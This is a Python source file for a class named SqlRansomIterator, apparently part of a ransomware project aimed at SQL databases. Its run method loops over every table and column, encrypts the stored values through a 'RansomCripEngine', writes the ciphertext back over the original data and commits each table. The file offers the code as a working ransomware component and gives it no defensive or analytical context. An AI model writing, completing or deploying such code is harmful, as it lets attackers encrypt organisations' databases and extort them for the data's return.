from domain.service.ISqlRansomIterator import ISqlRansomIterator
from domain.service.SqlRansomDTO import SqlRansomDTO
from domain.service.ColumnData import ColumnData
from domain.service.IRansomCripEngine import IRansomCripEngine


class SqlRansomIterator(ISqlRansomIterator):

    def run(self, dto: SqlRansomDTO) -> int:
        total = 0
        for table in dto.tables:
            columns = dto.get_columns(table)
            for col in columns:
                total += self._encrypt_column(dto.engine, col)
            dto.end_transaction()
        return total

    def _encrypt_column(self, engine: IRansomCripEngine, col: ColumnData) -> int:
        count = 0

        def write_fn(enc: bytes) -> None:
            nonlocal count
            col.write(enc)
            count += 1

        engine.execute(write_fn, col.values)
        return count
